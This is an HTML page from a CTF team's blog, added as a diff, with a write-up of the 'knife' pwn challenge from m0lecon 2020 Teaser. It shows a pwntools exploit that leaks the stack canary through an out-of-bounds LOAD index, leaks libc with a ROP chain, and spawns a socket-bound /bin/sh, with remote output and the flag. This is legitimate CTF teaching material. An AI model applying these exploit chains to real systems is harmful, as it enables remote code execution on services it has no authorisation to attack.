@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>fibonhack | knife</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/assets/css/main.css">
+
+
+    <link rel="shortcut icon" href="/assets/images/favicon.jpg">
+    <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167636907-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-167636907-1');
+    </script>
+
+</head>
+
+
+    <body>
+      <div class="container">
+
+        <header class="row">
+    <div class="col-lg-8 col-lg-offset-2">
+        <img class="main-logo" src="/assets/images/fibonhack.png" alt="fibonhack">
+    </div>
+</header>
+
+<div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <div class="menu glow-yellow">
+      <ul>
+          <li><a href="/" >home</a></li>
+          <li><a href="/resources" >resources</a></li>
+          <li><a href="/posts" >posts</a></li>
+          <li><a href="/writeups" >writeups</a></li>
+        </ul>
+    </div>
+  </div>
+</div>
+
+
+
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2">
+            <main>
+            <div class="post">
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header" style="padding-bottom: 0.8em;">
+    <p> 24 May 2020 </p>
+    <h1 style="margin: -0.02em auto;"> knife - m0lecon 2020 Teaser - pwn</h1>
+    <div id="authors"> by
+    
+    
+      
+      <a href="/members/OrsoBruno96">OrsoBruno96</a>, 
+      
+    
+      
+      <a href="/members/NicolaVV">NicolaVV</a>
+      
+    
+    
+    </div>
+  </header>
+
+  <article class="post-content">
+  <h2 id="the-challenge">The challenge</h2>
+<p>ELF 64-bits binary that listens on tcp port waiting for connections. It is not clear what the program should do, but for sure it does not handle it correctly.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>  checksec knife
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/orsobruno96/ctfs/m0lecon/knife'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+
+</code></pre></div></div>
+
+<h2 id="bugs">Bugs</h2>
+<ul>
+  <li>bound check for the command <code class="language-plaintext highlighter-rouge">LOAD &lt;idx&gt;</code>. This command lets you read variables on the stack indexed by <code class="language-plaintext highlighter-rouge">idx</code>. The check on <code class="language-plaintext highlighter-rouge">idx</code> is not done correctly, you can actually read negative indexes, canary included.</li>
+  <li>buffer overflow in the main command. You have control over <code class="language-plaintext highlighter-rouge">rbp+0x8</code>.</li>
+</ul>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<h3 id="surfing-bird">Surfing bird</h3>
+<p>We all hate birds that hide on the stack. We first exploit an out of bound to leak the canary, that doesn’t change after <code class="language-plaintext highlighter-rouge">fork()</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">ELF</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">gdb</span><span class="p">,</span> <span class="n">remote</span><span class="p">,</span> <span class="n">process</span><span class="p">,</span> <span class="n">log</span><span class="p">,</span> \
+    <span class="n">fit</span><span class="p">,</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">flat</span><span class="p">,</span> <span class="n">ui</span>
+
+
+<span class="k">def</span> <span class="nf">recv_bytes_cusu</span><span class="p">(</span><span class="n">off</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="o">-</span><span class="mi">19</span> <span class="o">&lt;</span> <span class="n">off</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">"Cusu out of bound"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"LOAD </span><span class="si">{</span><span class="n">off</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+    <span class="c1"># ui.pause()
+</span>    <span class="n">canary</span> <span class="o">=</span> <span class="n">recv_bytes_cusu</span><span class="p">(</span><span class="o">-</span><span class="mi">13</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<h3 id="leaking-libc-address">Leaking libc address</h3>
+<p>Then we reconnect to leak the libc address, using a buffer overflow and a rop
+chain. We use the fact that the file descriptor for the connection is always 4.
+This is because <code class="language-plaintext highlighter-rouge">fork()</code> duplicates entirely the process, including the
+file descriptor table.</p>
+
+<p>To effectively leak the libc we can read the GOT with a rop chain and use
+<code class="language-plaintext highlighter-rouge">sendlen(4, exe.sym.got['write'], size)</code> to read the answer. We cannot simply use
+<code class="language-plaintext highlighter-rouge">puts</code> or <code class="language-plaintext highlighter-rouge">printf</code> because standard output is not bound to our connection.</p>
+
+<p>The gadgets used for this rop chain can be found in the executable,
+You can leak libc addresses more than once to <a href="https://libc.blukat.me/">find</a> <code class="language-plaintext highlighter-rouge">libc6_2.27-3ubuntu1_amd64.deb</code>.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">pop</span> <span class="nb">rdi</span> <span class="c1">; POP_RDI 0x4014f3</span>
+    <span class="nf">ret</span>
+    <span class="c1">; ...</span>
+    <span class="nf">pop</span> <span class="nb">rsi</span> <span class="c1">; POP_RSI_POP_R15 0x4014f1</span>
+    <span class="nf">pop</span> <span class="nv">r15</span>
+    <span class="nf">ret</span>
+    <span class="c1">; ...</span>
+    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x20</span><span class="c1">; MOV_RDX_20 0x401528</span>
+    <span class="nf">ret</span>
+
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">leak_libc_address</span><span class="p">(</span><span class="n">canary</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
+    <span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"EXIT "</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">ebp_8_off</span><span class="p">]</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+        <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">),</span>
+        <span class="n">p64</span><span class="p">(</span><span class="mh">0x4</span><span class="p">),</span>
+        <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_POP_R15</span><span class="p">),</span>
+        <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">]),</span>
+        <span class="n">p64</span><span class="p">(</span><span class="mh">0x101010101010</span><span class="p">),</span>
+        <span class="n">p64</span><span class="p">(</span><span class="n">MOV_RDX_20</span><span class="p">),</span>
+        <span class="n">p64</span><span class="p">(</span><span class="n">exe</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">sendlen</span><span class="p">),</span>
+    <span class="p">)</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">canary_off</span><span class="p">]</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+    <span class="n">prettify_shellcode</span><span class="p">(</span><span class="n">fit</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fit</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"write addr: </span><span class="si">{</span><span class="n">res</span><span class="si">:</span><span class="c1">#08x</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">res</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">write</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"libc addr: </span><span class="si">{</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="si">:</span><span class="c1">#08x</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="drop-a-shell">Drop a shell</h3>
+<p>Now we connect a third time for the exploit. We know where libc is so
+we can rop chain <code class="language-plaintext highlighter-rouge">execve("/bin/sh", 0, 0)</code>, but we have to bind stdin and stdout
+to our socket. This is done via <code class="language-plaintext highlighter-rouge">dup2</code>,</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">execve</span><span class="p">(</span><span class="n">canary</span><span class="p">):</span>
+    <span class="s">"""
+    We want to build a rop to call the following
+    C code:
+    close(0);  // close stdin
+    close(1);  // close stdout
+    dup2(4, 0);  // bind stdin to socket
+    dup2(4, 1);  // bind stout to socket
+    execve("/bin/sh", 0, 0);  // pwn3d
+    """</span>
+    <span class="c1"># NOP are for stack alignment.
+</span>    <span class="n">rop</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="n">POP_RDI</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">NOP</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">close</span><span class="p">,</span>
+        <span class="n">POP_RDI</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">NOP</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">close</span><span class="p">,</span>
+        <span class="n">POP_RDI</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">libc_POP_RSI</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">dup2</span><span class="p">,</span>
+        <span class="n">POP_RDI</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">libc_POP_RSI</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">dup2</span><span class="p">,</span>
+        <span class="n">POP_RDI</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh"</span><span class="p">)),</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">libc_POP_RSI</span><span class="p">,</span>
+        <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="n">libc_POP_RDX</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">execve</span>
+    <span class="p">]</span>
+    <span class="n">rop</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">p64</span><span class="p">,</span> <span class="n">rop</span><span class="p">))</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
+    <span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"EXIT "</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">canary_off</span><span class="p">]</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+    <span class="n">payload</span><span class="p">[</span><span class="n">ebp_8_off</span><span class="p">]</span> <span class="o">=</span> <span class="n">rop</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fit</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h2 id="pwning">Pwning</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+    <span class="c1"># ui.pause()
+</span>    <span class="n">canary</span> <span class="o">=</span> <span class="n">recv_bytes_cusu</span><span class="p">(</span><span class="o">-</span><span class="mi">13</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+    <span class="c1"># ui.pause()
+</span>    <span class="n">leak_libc_address</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+    <span class="n">ui</span><span class="p">.</span><span class="n">pause</span><span class="p">()</span>
+    <span class="n">execve</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>  ./pwn_knife.py REMOTE
+...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> write addr: 0x7fcd7d63c140
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> libc addr: 0x7fcd7d52c000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span> <span class="nb">ls
+</span>chall
+config.txt
+flag.txt
+<span class="nv">$ </span> <span class="nb">cat </span>flag.txt
+ptm<span class="o">{</span>f0rk5_ar3n7_g00d_f0r_cnr13s<span class="o">}</span>
+</code></pre></div></div>
+
+  </article>
+</div>
+
+  </article>
+
+</div>
+
+            </main>
+          </div>
+        </div>
+
+        <div class="row">
+    <div class="col-lg-8 col-lg-offset-2">
+        <footer>
+            <div>
+                <div class="footer left column one-half">
+                    <small class="glow-yellow">
+                        Theme <a href="https://github.com/gildasio/clyell"> clyell</a> by <a
+                            href="https://github.com/gildasio/">gildasio</a> <br class="hidden visible-xs">powered by <a
+                            href="https://github.com/jekyll/jekyll">{{ jekyll }}</a>
+                    </small>
+                </div>
+
+                <div class="footer right column one-half">
+                    <section class="small-font">
+                        <a href="https://twitter.com/fibonhack"><span class="icon icon--twitter">
+    <svg viewBox="0 0 16 16">
+        <path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/>
+    </svg>
+</span>
+</a>
+                        <a href="https://github.com/fibonhack"><span class="icon icon--github">
+    <svg viewBox="0 0 16 16">
+        <path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/>
+    </svg>
+</span>
+</a>
+                    </section>
+                </div>
+            </div>
+        </footer>
+    </div>
+</div>
+
+      </div>
+    </body>
+</html>
